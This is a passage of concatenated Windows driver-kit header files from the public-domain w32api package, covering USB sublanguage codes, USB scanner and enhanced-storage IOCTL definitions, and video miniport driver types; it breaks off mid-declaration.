#define USB_SUBLANG_ARABIC_JORDAN		0x11
#define USB_SUBLANG_ARABIC_LEBANON		0x12
#define USB_SUBLANG_ARABIC_KUWAIT		0x13
#define USB_SUBLANG_ARABIC_UAE			0x14
#define USB_SUBLANG_ARABIC_BAHRAIN		0x15
#define USB_SUBLANG_ARABIC_QATAR		0x16
#define USB_SUBLANG_AZERI_CYRILLIC		0x01
#define USB_SUBLANG_AZERI_LATIN			0x02
#define USB_SUBLANG_CHINESE_TRADITIONAL		0x01
#define USB_SUBLANG_CHINESE_SIMPLIFIED		0x02
#define USB_SUBLANG_CHINESE_HONGKONG		0x03
#define USB_SUBLANG_CHINESE_SINGAPORE		0x04
#define USB_SUBLANG_CHINESE_MACAU		0x05
#define USB_SUBLANG_DUTCH			0x01
#define USB_SUBLANG_DUTCH_BELGIAN		0x02
#define USB_SUBLANG_ENGLISH_US			0x01
#define USB_SUBLANG_ENGLISH_UK			0x02
#define USB_SUBLANG_ENGLISH_AUS			0x03
#define USB_SUBLANG_ENGLISH_CAN			0x04
#define USB_SUBLANG_ENGLISH_NZ			0x05
#define USB_SUBLANG_ENGLISH_EIRE		0x06
#define USB_SUBLANG_ENGLISH_SOUTH_AFRICA	0x07
#define USB_SUBLANG_ENGLISH_JAMAICA		0x08
#define USB_SUBLANG_ENGLISH_CARIBBEAN		0x09
#define USB_SUBLANG_ENGLISH_BELIZE		0x0a
#define USB_SUBLANG_ENGLISH_TRINIDAD		0x0b
#define USB_SUBLANG_ENGLISH_PHILIPPINES		0x0c
#define USB_SUBLANG_ENGLISH_ZIMBABWE		0x0d
#define USB_SUBLANG_FRENCH			0x01
#define USB_SUBLANG_FRENCH_BELGIAN		0x02
#define USB_SUBLANG_FRENCH_CANADIAN		0x03
#define USB_SUBLANG_FRENCH_SWISS		0x04
#define USB_SUBLANG_FRENCH_LUXEMBOURG		0x05
#define USB_SUBLANG_FRENCH_MONACO		0x06
#define USB_SUBLANG_GERMAN			0x01
#define USB_SUBLANG_GERMAN_SWISS		0x02
#define USB_SUBLANG_GERMAN_AUSTRIAN		0x03
#define USB_SUBLANG_GERMAN_LUXEMBOURG		0x04
#define USB_SUBLANG_GERMAN_LIECHTENSTEIN	0x05
#define USB_SUBLANG_ITALIAN			0x01
#define USB_SUBLANG_ITALIAN_SWISS		0x02
#define USB_SUBLANG_KASHMIRI_INDIA		0x02
#define USB_SUBLANG_KOREAN			0x01
#define USB_SUBLANG_LITHUANIAN			0x01
#define USB_SUBLANG_MALAY_MALAYSIA		0x01
#define USB_SUBLANG_MALAY_BRUNEI_DARUSSALAM	0x02
#define USB_SUBLANG_NEPALI_INDIA		0x02
#define USB_SUBLANG_NORWEGIAN_BOKMAL		0x01
#define USB_SUBLANG_NORWEGIAN_NYNORSK		0x02
#define USB_SUBLANG_PORTUGUESE			0x01
#define USB_SUBLANG_PORTUGUESE_BRAZILIAN	0x02
#define USB_SUBLANG_SERBIAN_LATIN		0x02
#define USB_SUBLANG_SERBIAN_CYRILLIC		0x03
#define USB_SUBLANG_SPANISH			0x01
#define USB_SUBLANG_SPANISH_MEXICAN		0x02
#define USB_SUBLANG_SPANISH_MODERN		0x03
#define USB_SUBLANG_SPANISH_GUATEMALA		0x04
#define USB_SUBLANG_SPANISH_COSTA_RICA		0x05
#define USB_SUBLANG_SPANISH_PANAMA		0x06
#define USB_SUBLANG_SPANISH_DOMINICAN_REPUBLIC	0x07
#define USB_SUBLANG_SPANISH_VENEZUELA		0x08
#define USB_SUBLANG_SPANISH_COLOMBIA		0x09
#define USB_SUBLANG_SPANISH_PERU		0x0a
#define USB_SUBLANG_SPANISH_ARGENTINA		0x0b
#define USB_SUBLANG_SPANISH_ECUADOR		0x0c
#define USB_SUBLANG_SPANISH_CHILE		0x0d
#define USB_SUBLANG_SPANISH_URUGUAY		0x0e
#define USB_SUBLANG_SPANISH_PARAGUAY		0x0f
#define USB_SUBLANG_SPANISH_BOLIVIA		0x10
#define USB_SUBLANG_SPANISH_EL_SALVADOR		0x11
#define USB_SUBLANG_SPANISH_HONDURAS		0x12
#define USB_SUBLANG_SPANISH_NICARAGUA		0x13
#define USB_SUBLANG_SPANISH_PUERTO_RICO		0x14
#define USB_SUBLANG_SWEDISH			0x01
#define USB_SUBLANG_SWEDISH_FINLAND		0x02
#define USB_SUBLANG_URDU_PAKISTAN		0x01
#define USB_SUBLANG_URDU_INDIA			0x02
#define USB_SUBLANG_UZBEK_LATIN			0x01
#define USB_SUBLANG_UZBEK_CYRILLIC		0x02
#define USB_SUBLANG_HID_USAGE_DATA_DESCRIPTOR	0x01
#define USB_SUBLANG_HID_VENDOR_DEFINED_1	0x3c
#define USB_SUBLANG_HID_VENDOR_DEFINED_2	0x3d
#define USB_SUBLANG_HID_VENDOR_DEFINED_3	0x3e
#define USB_SUBLANG_HID_VENDOR_DEFINED_4	0x3f

#endif /* !defined(MIDL_PASS) */

#include <poppack.h>


```

`include/ddk/usbscan.h`:

```h
/*
 * usbscan.h
 *
 * USB scanner definitions
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#pragma once

#ifdef __cplusplus
extern "C" {
#endif

#if (NTDDI_VERSION >= NTDDI_WIN2K)

#pragma pack(push,8)

#ifndef MAX_NUM_PIPES
#define MAX_NUM_PIPES                     8
#endif

#define BULKIN_FLAG                       0x80

typedef struct _DRV_VERSION {
  OUT ULONG major;
  OUT ULONG minor;
  OUT ULONG internal;
} DRV_VERSION, *PDRV_VERSION;

typedef struct _IO_BLOCK {
  IN ULONG uOffset;
  IN ULONG uLength;
  IN OUT PUCHAR pbyData;
  IN ULONG uIndex;
} IO_BLOCK, *PIO_BLOCK;

typedef struct _IO_BLOCK_EX {
  IN ULONG uOffset;
  IN ULONG uLength;
  IN OUT PUCHAR pbyData;
  IN ULONG uIndex;
  IN UCHAR bRequest;
  IN UCHAR bmRequestType;
  IN UCHAR fTransferDirectionIn;
} IO_BLOCK_EX, *PIO_BLOCK_EX;

typedef struct _CHANNEL_INFO {
  OUT ULONG EventChannelSize;
  OUT ULONG uReadDataAlignment;
  OUT ULONG uWriteDataAlignment;
}CHANNEL_INFO, *PCHANNEL_INFO;

typedef enum _PIPE_TYPE {
  EVENT_PIPE,
  READ_DATA_PIPE,
  WRITE_DATA_PIPE,
  ALL_PIPE
} PIPE_TYPE;

typedef struct _USBSCAN_GET_DESCRIPTOR {
  IN UCHAR DescriptorType;
  IN UCHAR Index;
  IN USHORT LanguageId;
} USBSCAN_GET_DESCRIPTOR, *PUSBSCAN_GET_DESCRIPTOR;

typedef struct _DEVICE_DESCRIPTOR {
  OUT USHORT usVendorId;
  OUT USHORT usProductId;
  OUT USHORT usBcdDevice;
  OUT USHORT usLanguageId;
} DEVICE_DESCRIPTOR, *PDEVICE_DESCRIPTOR;

typedef enum _RAW_PIPE_TYPE {
  USBSCAN_PIPE_CONTROL,
  USBSCAN_PIPE_ISOCHRONOUS,
  USBSCAN_PIPE_BULK,
  USBSCAN_PIPE_INTERRUPT
} RAW_PIPE_TYPE;

typedef struct _USBSCAN_PIPE_INFORMATION {
  USHORT MaximumPacketSize;
  UCHAR EndpointAddress;
  UCHAR Interval;
  RAW_PIPE_TYPE PipeType;
} USBSCAN_PIPE_INFORMATION, *PUSBSCAN_PIPE_INFORMATION;

typedef struct _USBSCAN_PIPE_CONFIGURATION {
  OUT ULONG NumberOfPipes;
  OUT USBSCAN_PIPE_INFORMATION PipeInfo[MAX_NUM_PIPES];
} USBSCAN_PIPE_CONFIGURATION, *PUSBSCAN_PIPE_CONFIGURATION;

#if (NTDDI_VERSION >= NTDDI_WINXP)
typedef struct _USBSCAN_TIMEOUT {
  IN ULONG TimeoutRead;
  IN ULONG TimeoutWrite;
  IN ULONG TimeoutEvent;
} USBSCAN_TIMEOUT, *PUSBSCAN_TIMEOUT;
#endif

#define FILE_DEVICE_USB_SCAN              0x8000
#define IOCTL_INDEX                       0x0800

#define IOCTL_GET_VERSION \
  CTL_CODE(FILE_DEVICE_USB_SCAN, IOCTL_INDEX + 0, METHOD_BUFFERED,FILE_ANY_ACCESS)

#define IOCTL_CANCEL_IO \
  CTL_CODE(FILE_DEVICE_USB_SCAN, IOCTL_INDEX + 1, METHOD_BUFFERED,FILE_ANY_ACCESS)

#define IOCTL_WAIT_ON_DEVICE_EVENT \
  CTL_CODE(FILE_DEVICE_USB_SCAN, IOCTL_INDEX + 2, METHOD_BUFFERED,FILE_ANY_ACCESS)

#define IOCTL_READ_REGISTERS \
  CTL_CODE(FILE_DEVICE_USB_SCAN, IOCTL_INDEX + 3, METHOD_BUFFERED,FILE_ANY_ACCESS)

#define IOCTL_WRITE_REGISTERS \
  CTL_CODE(FILE_DEVICE_USB_SCAN, IOCTL_INDEX + 4, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_GET_CHANNEL_ALIGN_RQST \
  CTL_CODE(FILE_DEVICE_USB_SCAN, IOCTL_INDEX + 5, METHOD_BUFFERED,FILE_ANY_ACCESS)

#define IOCTL_GET_DEVICE_DESCRIPTOR \
  CTL_CODE(FILE_DEVICE_USB_SCAN, IOCTL_INDEX + 6, METHOD_BUFFERED,FILE_ANY_ACCESS)

#define IOCTL_RESET_PIPE \
  CTL_CODE(FILE_DEVICE_USB_SCAN, IOCTL_INDEX + 7, METHOD_BUFFERED,FILE_ANY_ACCESS)

#define IOCTL_GET_USB_DESCRIPTOR \
  CTL_CODE(FILE_DEVICE_USB_SCAN, IOCTL_INDEX + 8, METHOD_BUFFERED,FILE_ANY_ACCESS)

#define IOCTL_SEND_USB_REQUEST \
  CTL_CODE(FILE_DEVICE_USB_SCAN, IOCTL_INDEX + 9, METHOD_BUFFERED,FILE_ANY_ACCESS)

#define IOCTL_GET_PIPE_CONFIGURATION \
  CTL_CODE(FILE_DEVICE_USB_SCAN, IOCTL_INDEX + 10,METHOD_BUFFERED,FILE_ANY_ACCESS)

#if (NTDDI_VERSION >= NTDDI_WINXP)
#define IOCTL_SET_TIMEOUT \
  CTL_CODE(FILE_DEVICE_USB_SCAN, IOCTL_INDEX + 11,METHOD_BUFFERED,FILE_ANY_ACCESS)
#endif

#pragma pack(pop)

#endif // (NTDDI_VERSION >= NTDDI_WIN2K)

#ifdef __cplusplus
}
#endif

```

`include/ddk/usbstorioctl.h`:

```h
#pragma once

#ifndef MAX_PATH
#define MAX_PATH 260
#endif

typedef struct tagACT_AUTHZ_STATE {
  UCHAR ACT;
  BOOLEAN fAuthorized;
} ACT_AUTHZ_STATE, *PACT_AUTHZ_STATE;

typedef struct tagSILO_COMMAND {
  UCHAR SiloIndex;
  UCHAR Command;
  ULONG cbCommandBuffer;
  UCHAR rgbCommandBuffer[ANYSIZE_ARRAY];
} SILO_COMMAND, *PSILO_COMMAND;

typedef enum _PDO_TYPE {
  PDO_TYPE_UNDEFINED = 0,
  PDO_TYPE_DISK,
  PDO_TYPE_CONTROL,
  PDO_TYPE_SILO,
  PDO_TYPE_THIS = 256
} PDO_TYPE;

typedef enum _PDO_STATE {
  PDO_STATE_UNDEFINED = 0,
  PDO_STATE_STARTED,
  PDO_STATE_NOT_STARTED
} PDO_STATE;

typedef enum _PDO_CAPS {
  PDO_CAPABILITY_UNDEFINED = 0,
  PDO_CAPABILITY_INC512_SET = 1,
  PDO_CAPABILITY_INC512_CLEAR = 2
} PDO_CAPS;

typedef struct _ENUM_PDO_ENTRY {
  UCHAR type;
  UCHAR state;
  UCHAR capabilities;
  ULONG ulSTID;
  UCHAR bSpecificationMajor;
  UCHAR bSpecificationMinor;
  UCHAR bImplementationMajor;
  UCHAR bImplementationMinor;
  WCHAR wszDeviceInstancePath[(2 * MAX_PATH) + 1];
} ENUM_PDO_ENTRY, *PENUM_PDO_ENTRY;

typedef struct _ENUM_PDO_RESULTS {
  ULONG cEntries;
  ENUM_PDO_ENTRY rgEntries[ANYSIZE_ARRAY];
} ENUM_PDO_RESULTS, *PENUM_PDO_RESULTS;

#define SIZE_ENUM_PDO_RESULTS_HEADER (sizeof(ENUM_PDO_RESULTS) - sizeof(ENUM_PDO_ENTRY))

#define IOCTL_EHSTOR_DEVICE_SET_AUTHZ_STATE   CTL_CODE(IOCTL_STORAGE_BASE, 0x501, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_EHSTOR_DEVICE_GET_AUTHZ_STATE   CTL_CODE(IOCTL_STORAGE_BASE, 0x502, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_EHSTOR_DEVICE_SILO_COMMAND      CTL_CODE(IOCTL_STORAGE_BASE, 0x503, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_EHSTOR_DEVICE_ENUMERATE_PDOS    CTL_CODE(IOCTL_STORAGE_BASE, 0x504, METHOD_BUFFERED, FILE_ANY_ACCESS)

DEFINE_GUID(GUID_USBSTOR_EHSTOR_SILO_INTERFACE, 0x7c2bcf57, 0x2bea, 0x46da, 0xad, 0x26, 0x78, 0xfd, 0xc8, 0x3c, 0xee, 0x46);
DEFINE_GUID(GUID_USBSTOR_EHSTOR_CONTROL_INTERFACE, 0x4f40006f, 0xb933, 0x4550, 0xb5, 0x32, 0x2b, 0x58, 0xce, 0xe6, 0x14, 0xd3);


```

`include/ddk/video.h`:

```h
/*
 * video.h
 *
 * Video port and miniport driver interface
 *
 * This file is part of the w32api package.
 *
 * Contributors:
 *   Created by Casper S. Hornstrup <chorns@users.sourceforge.net>
 *
 * THIS SOFTWARE IS NOT COPYRIGHTED
 *
 * This source code is offered for use in the public domain. You may
 * use, modify or distribute it freely.
 *
 * This code is distributed in the hope that it will be useful but
 * WITHOUT ANY WARRANTY. ALL WARRANTIES, EXPRESS OR IMPLIED ARE HEREBY
 * DISCLAIMED. This includes but is not limited to warranties of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */

#pragma once

#define __VIDEO_H__

#include "ntddvdeo.h"
#include "videoagp.h"

#ifdef __cplusplus
extern "C" {
#endif

#ifndef _NTOSDEF_

#ifdef PAGED_CODE
#undef PAGED_CODE
#endif

#if defined(_MSC_VER)
#define ALLOC_PRAGMA 1
#endif

#if defined(_VIDEOPORT_)
#define VPAPI
#else
#define VPAPI DECLSPEC_IMPORT
#endif

#if DBG
#define PAGED_CODE() \
  if (VideoPortGetCurrentIrql() > 1 /* APC_LEVEL */) { \
    VideoPortDebugPrint(Error, "Video: Pageable code called at IRQL %d\n", VideoPortGetCurrentIrql() ); \
    ASSERT(FALSE); \
  }
#else
#define PAGED_CODE()
#endif /* DBG */

ULONG
NTAPI
DriverEntry(
  PVOID Context1,
  PVOID Context2);

#else

#define VPAPI

#endif /* _NTOSDEF_ */

#if DBG
#define VideoDebugPrint(x) VideoPortDebugPrint x
#else
#define VideoDebugPrint(x)
#endif

#define GET_VIDEO_PHYSICAL_ADDRESS(scatterList,                        \
                                   VirtualAddress,                     \
                                   InputBuffer,                        \
                                   pLength,                            \
                                   Address)                            \
  do {                                                                 \
    ULONG_PTR byteOffset;                                              \
                                                                       \
    byteOffset = (PCHAR) VirtualAddress - (PCHAR)InputBuffer;          \
    while (byteOffset >= scatterList->Length) {                        \
      byteOffset -= scatterList->Length;                               \
      scatterList++;                                                   \
    }                                                                  \
    *pLength = scatterList->Length - byteOffset;                       \
    Address = (ULONG_PTR) (scatterList->PhysicalAddress + byteOffset); \
  } while (0)

#define GET_VIDEO_SCATTERGATHER(ppDma) (**(PVRB_SG **)ppDma)

/* VIDEO_ACCESS_RANGE.RangePassive */
#define VIDEO_RANGE_PASSIVE_DECODE        1
#define VIDEO_RANGE_10_BIT_DECODE         2

#define SIZE_OF_NT4_VIDEO_PORT_CONFIG_INFO FIELD_OFFSET(VIDEO_PORT_CONFIG_INFO, Master)
#define SIZE_OF_WXP_VIDEO_PORT_CONFIG_INFO sizeof(VIDEO_PORT_CONFIG_INFO)

#define SET_USER_EVENT    0x01
#define SET_DISPLAY_EVENT 0x02

#define EVENT_TYPE_MASK                   1
#define SYNCHRONIZATION_EVENT             0
#define NOTIFICATION_EVENT                1

#define INITIAL_EVENT_STATE_MASK          2
#define INITIAL_EVENT_NOT_SIGNALED        0
#define INITIAL_EVENT_SIGNALED            2

#define DISPLAY_ADAPTER_HW_ID             0xFFFFFFFF

#define VIDEO_INVALID_CHILD_ID            0xFFFFFFFF

#define SIZE_OF_NT4_VIDEO_HW_INITIALIZATION_DATA FIELD_OFFSET(VIDEO_HW_INITIALIZATION_DATA, HwStartDma)
#define SIZE_OF_W2K_VIDEO_HW_INITIALIZATION_DATA FIELD_OFFSET(VIDEO_HW_INITIALIZATION_DATA, Reserved)
#define SIZE_OF_WXP_VIDEO_HW_INITIALIZATION_DATA (SIZE_OF_W2K_VIDEO_HW_INITIALIZATION_DATA + sizeof(ULONG))

#define VIDEO_PORT_AGP_INTERFACE_VERSION_1                 1
#define VIDEO_PORT_AGP_INTERFACE_VERSION_2                 2
#define VIDEO_PORT_I2C_INTERFACE_VERSION_1                 1
#define VIDEO_PORT_I2C_INTERFACE_VERSION_2                 2
#define VIDEO_PORT_INT10_INTERFACE_VERSION_1               1
#define VIDEO_PORT_WCMEMORYPROTECTION_INTERFACE_VERSION_1  1
#define VIDEO_PORT_DEBUG_REPORT_INTERFACE_VERSION_1        1

/* Flags for VideoPortGetDeviceBase and VideoPortMapMemory */
#define VIDEO_MEMORY_SPACE_MEMORY         0x00
#define VIDEO_MEMORY_SPACE_IO             0x01
#define VIDEO_MEMORY_SPACE_USER_MODE      0x02
#define VIDEO_MEMORY_SPACE_DENSE          0x04
#define VIDEO_MEMORY_SPACE_P6CACHE        0x08

/* PVIDEO_HW_GET_CHILD_DESCRIPTOR return values */
#define VIDEO_ENUM_MORE_DEVICES           ERROR_CONTINUE
#define VIDEO_ENUM_NO_MORE_DEVICES        ERROR_NO_MORE_DEVICES
#define VIDEO_ENUM_INVALID_DEVICE         ERROR_INVALID_NAME

#define DEVICE_VGA_ENABLED                1

/* VideoPortCheckForDeviceExistence.Flags constants */
#define CDE_USE_SUBSYSTEM_IDS             0x00000001
#define CDE_USE_REVISION                  0x00000002

#define BUGCHECK_DATA_SIZE_RESERVED       48

#define VIDEO_DEBUG_REPORT_MAX_SIZE       0x8000

typedef LONG VP_STATUS, *PVP_STATUS;
typedef ULONG DMA_EVENT_FLAGS;

typedef struct _VIDEO_PORT_SPIN_LOCK *PSPIN_LOCK;
typedef struct _VIDEO_DEBUG_REPORT *PVIDEO_DEBUG_REPORT;
typedef struct __DMA_PARAMETERS *PDMA;
typedef struct __VP_DMA_ADAPTER *PVP_DMA_ADAPTER;

typedef PVOID
(NTAPI *PVIDEO_PORT_GET_PROC_ADDRESS)(
  IN PVOID HwDeviceExtension,
  IN PUCHAR FunctionName);

typedef struct _VIDEO_PORT_CONFIG_INFO {
  ULONG Length;
  ULONG SystemIoBusNumber;
  INTERFACE_TYPE AdapterInterfaceType;
  ULONG BusInterruptLevel;
  ULONG BusInterruptVector;
  KINTERRUPT_MODE InterruptMode;
  ULONG NumEmulatorAccessEntries;
  PEMULATOR_ACCESS_ENTRY EmulatorAccessEntries;
  ULONG_PTR EmulatorAccessEntriesContext;
  PHYSICAL_ADDRESS VdmPhysicalVideoMemoryAddress;
  ULONG VdmPhysicalVideoMemoryLength;
  ULONG HardwareStateSize;
  ULONG DmaChannel;
  ULONG DmaPort;
  UCHAR DmaShareable;
  UCHAR InterruptShareable;
  BOOLEAN Master;
  DMA_WIDTH DmaWidth;
  DMA_SPEED DmaSpeed;
  BOOLEAN bMapBuffers;
  BOOLEAN NeedPhysicalAddresses;
  BOOLEAN DemandMode;
  ULONG MaximumTransferLength;
  ULONG NumberOfPhysicalBreaks;
  BOOLEAN ScatterGather;
  ULONG MaximumScatterGatherChunkSize;
  PVIDEO_PORT_GET_PROC_ADDRESS VideoPortGetProcAddress;
  PWSTR DriverRegistryPath;
  ULONGLONG SystemMemorySize;
} VIDEO_PORT_CONFIG_INFO, *PVIDEO_PORT_CONFIG_INFO;

typedef VP_STATUS
(NTAPI *PVIDEO_HW_FIND_ADAPTER)(
  IN PVOID HwDeviceExtension,
  IN PVOID HwContext,
  IN PWSTR ArgumentString,
  IN OUT PVIDEO_PORT_CONFIG_INFO ConfigInfo,
  OUT PUCHAR Again);

typedef BOOLEAN
(NTAPI *PVIDEO_HW_INITIALIZE)(
  IN PVOID HwDeviceExtension);

typedef BOOLEAN
(NTAPI *PVIDEO_HW_INTERRUPT)(
  IN PVOID HwDeviceExtension);

typedef struct _VIDEO_ACCESS_RANGE {
  PHYSICAL_ADDRESS RangeStart;
  ULONG RangeLength;
  UCHAR RangeInIoSpace;
  UCHAR RangeVisible;
  UCHAR RangeShareable;
  UCHAR RangePassive;
} VIDEO_ACCESS_RANGE, *PVIDEO_ACCESS_RANGE;

typedef VOID
(NTAPI *PVIDEO_HW_LEGACYRESOURCES)(
  IN ULONG VendorId,
  IN ULONG DeviceId,
  IN OUT PVIDEO_ACCESS_RANGE *LegacyResourceList,
  IN OUT PULONG LegacyResourceCount);

typedef enum _HW_DMA_RETURN {
  DmaAsyncReturn,
  DmaSyncReturn
} HW_DMA_RETURN, *PHW_DMA_RETURN;

typedef HW_DMA_RETURN
(NTAPI *PVIDEO_HW_START_DMA)(
  PVOID HwDeviceExtension,
  PDMA pDma);

typedef struct _VP_SCATTER_GATHER_ELEMENT {
  PHYSICAL_ADDRESS Address;
  ULONG Length;
  ULONG_PTR Reserved;
} VP_SCATTER_GATHER_ELEMENT, *PVP_SCATTER_GATHER_ELEMENT;

typedef struct _VP_SCATTER_GATHER_LIST {
  ULONG NumberOfElements;
  ULONG_PTR Reserved;
  VP_SCATTER_GATHER_ELEMENT Elements[0];
} VP_SCATTER_GATHER_LIST, *PVP_SCATTER_GATHER_LIST;

typedef VOID
(NTAPI *PEXECUTE_DMA)(
  IN PVOID HwDeviceExtension,
  IN PVP_DMA_ADAPTER VpDmaAdapter,
  IN PVP_SCATTER_GATHER_LIST SGList,
  IN PVOID Context);

/* PVIDEO_HW_GET_CHILD_DESCRIPTOR.ChildEnumInfo constants */
typedef struct _VIDEO_CHILD_ENUM_INFO {
  ULONG Size;
  ULONG ChildDescriptorSize;
  ULONG ChildIndex;
  ULONG ACPIHwId;
  PVOID ChildHwDeviceExtension;
} VIDEO_CHILD_ENUM_INFO, *PVIDEO_CHILD_ENUM_INFO;

/* PVIDEO_HW_GET_CHILD_DESCRIPTOR.VideoChildType constants */
typedef enum _VIDEO_CHILD_TYPE {
  Monitor = 1,
  NonPrimaryChip,
  VideoChip,
  Other
} VIDEO_CHILD_TYPE, *PVIDEO_CHILD_TYPE;

typedef VP_STATUS
(NTAPI *PVIDEO_HW_GET_CHILD_DESCRIPTOR)(
  IN PVOID HwDeviceExtension,
  IN PVIDEO_CHILD_ENUM_INFO ChildEnumInfo,
  OUT PVIDEO_CHILD_TYPE VideoChildType,
  OUT PUCHAR pChildDescriptor,
  OUT PULONG UId,
  OUT PULONG pUnused);

typedef VP_STATUS
(NTAPI *PVIDEO_HW_POWER_SET)(
  IN PVOID HwDeviceExtension,
  IN ULONG HwId,
  IN PVIDEO_POWER_MANAGEMENT VideoPowerControl);

typedef VP_STATUS
(NTAPI *PVIDEO_HW_POWER_GET)(
  IN PVOID HwDeviceExtension,
  IN ULONG HwId,
  IN OUT PVIDEO_POWER_MANAGEMENT VideoPowerControl);

typedef struct _QUERY_INTERFACE {
  CONST GUID *InterfaceType;
  USHORT Size;
  USHORT Version;
  PINTERFACE Interface;
  PVOID InterfaceSpecificData;
} QUERY_INTERFACE, *PQUERY_INTERFACE;

typedef VP_STATUS
(NTAPI *PVIDEO_HW_QUERY_INTERFACE)(
  IN PVOID HwDeviceExtension,
  IN OUT PQUERY_INTERFACE QueryInterface);

typedef VP_STATUS
(NTAPI *PVIDEO_HW_CHILD_CALLBACK)(
  PVOID HwDeviceExtension,
  PVOID ChildDeviceExtension);

typedef BOOLEAN
(NTAPI *PVIDEO_HW_RESET_HW)(
  IN PVOID HwDeviceExtension,
  IN ULONG Columns,
  IN ULONG Rows);

typedef struct _STATUS_BLOCK {
  _ANONYMOUS_UNION union {
    VP_STATUS Status;
    PVOID Pointer;
  } DUMMYUNIONNAME;
  ULONG_PTR Information;
} STATUS_BLOCK, *PSTATUS_BLOCK;

typedef struct _VIDEO_REQUEST_PACKET {
  ULONG IoControlCode;
  PSTATUS_BLOCK StatusBlock;
  PVOID InputBuffer;
  ULONG InputBufferLength;
  PVOID OutputBuffer;
  ULONG OutputBufferLength;
} VIDEO_REQUEST_PACKET, *PVIDEO_REQUEST_PACKET;

typedef BOOLEAN
(NTAPI *PVIDEO_HW_START_IO)(
  IN PVOID HwDeviceExtension,
  IN PVIDEO_REQUEST_PACKET RequestPacket);

typedef VOID
(NTAPI *PVIDEO_HW_TIMER)(
  IN PVOID HwDeviceExtension);

typedef VOID
(NTAPI *PVIDEO_WRITE_CLOCK_LINE)(
  PVOID HwDeviceExtension,
  UCHAR Data);

typedef VOID
(NTAPI *PVIDEO_WRITE_DATA_LINE)(
  PVOID HwDeviceExtension,
  UCHAR Data);

typedef BOOLEAN
(NTAPI *PVIDEO_READ_CLOCK_LINE)(
  PVOID HwDeviceExtension);

typedef BOOLEAN
(NTAPI *PVIDEO_READ_DATA_LINE)(
  PVOID HwDeviceExtension);

typedef VOID
(NTAPI *PVIDEO_WAIT_VSYNC_ACTIVE)(
  PVOID HwDeviceExtension);

typedef struct _I2C_CALLBACKS {
  IN PVIDEO_WRITE_CLOCK_LINE WriteClockLine;
  IN PVIDEO_WRITE_DATA_LINE WriteDataLine;
  IN PVIDEO_READ_CLOCK_LINE ReadClockLine;
  IN PVIDEO_READ_DATA_LINE ReadDataLine;
} I2C_CALLBACKS, *PI2C_CALLBACKS;

typedef BOOLEAN
(NTAPI *PI2C_START)(
  IN PVOID HwDeviceExtension,
  IN PI2C_CALLBACKS I2CCallbacks);

typedef BOOLEAN
(NTAPI *PI2C_STOP)(
  IN PVOID HwDeviceExtension,
  IN PI2C_CALLBACKS I2CCallbacks);

typedef BOOLEAN
(NTAPI *PI2C_WRITE)(
  IN PVOID HwDeviceExtension,
  IN PI2C_CALLBACKS I2CCallbacks,
  IN PUCHAR Buffer,
  IN ULONG Length);

typedef BOOLEAN
(NTAPI *PI2C_READ)(
  IN PVOID HwDeviceExtension,
  IN PI2C_CALLBACKS I2CCallbacks,
  OUT PUCHAR Buffer,
  IN ULONG Length);

typedef struct _VIDEO_I2C_CONTROL {
  IN PVIDEO_WRITE_CLOCK_LINE WriteClockLine;
  IN PVIDEO_WRITE_DATA_LINE WriteDataLine;
  IN PVIDEO_READ_CLOCK_LINE ReadClockLine;
  IN PVIDEO_READ_DATA_LINE ReadDataLine;
  IN ULONG I2CDelay;
} VIDEO_I2C_CONTROL, *PVIDEO_I2C_CONTROL;

typedef BOOLEAN
(NTAPI *PI2C_START_2)(
  IN PVOID HwDeviceExtension,
  IN PVIDEO_I2C_CONTROL I2CControl);

typedef BOOLEAN
(NTAPI *PI2C_STOP_2)(
  IN PVOID HwDeviceExtension,
  IN PVIDEO_I2C_CONTROL I2CControl);

typedef BOOLEAN
(NTAPI *PI2C_WRITE_2)(
  IN PVOID HwDeviceExtension,
  IN PVIDEO_I2C_CONTROL I2CControl,
  IN PUCHAR Buffer,
  IN ULONG Length);

typedef BOOLEAN
(NTAPI *PI2C_READ_2)(
  IN PVOID HwDeviceExtension,
  IN PVIDEO_I2C_CONTROL I2CControl,
  OUT PUCHAR Buffer,
  IN ULONG Length,
  IN BOOLEAN EndOfRead);

typedef struct _INT10_BIOS_ARGUMENTS {
  ULONG Eax;
  ULONG Ebx;
  ULONG Ecx;
  ULONG Edx;
  ULONG Esi;
  ULONG Edi;
  ULONG Ebp;
  USHORT SegDs;
  USHORT SegEs;
} INT10_BIOS_ARGUMENTS, *PINT10_BIOS_ARGUMENTS;

typedef VP_STATUS
(NTAPI *PINT10_CALL_BIOS)(
  IN PVOID Context,
  IN OUT PINT10_BIOS_ARGUMENTS BiosArguments);

typedef VP_STATUS
(NTAPI *PINT10_ALLOCATE_BUFFER)(
  IN PVOID Context,
  OUT PUSHORT Seg,
  OUT PUSHORT Off,
  IN OUT PULONG Length);

typedef VP_STATUS
(NTAPI *PINT10_FREE_BUFFER)(
  IN PVOID Context,
  IN USHORT Seg,
  IN USHORT Off);

typedef VP_STATUS
(NTAPI *PINT10_READ_MEMORY)(
  IN PVOID Context,
  IN USHORT Seg,
  IN USHORT Off,
  OUT PVOID Buffer,
  IN ULONG Length);

typedef VP_STATUS
(NTAPI *PINT10_WRITE_MEMORY)(
  IN PVOID Context,
  IN USHORT Seg,
  IN USHORT Off,
  IN PVOID Buffer,
  IN ULONG Length);

typedef VP_STATUS
(NTAPI *PROTECT_WC_MEMORY)(
  IN PVOID Context,
  IN PVOID HwDeviceExtension);

typedef VP_STATUS
(NTAPI *RESTORE_WC_MEMORY)(
  IN PVOID Context,
  IN PVOID HwDeviceExtension);

typedef enum _VIDEO_DEVICE_DATA_TYPE {
  VpMachineData = 0,
  VpCmosData,
  VpBusData,
  VpControllerData,
  VpMonitorData
} VIDEO_DEVICE_DATA_TYPE, *PVIDEO_DEVICE_DATA_TYPE;

typedef VP_STATUS
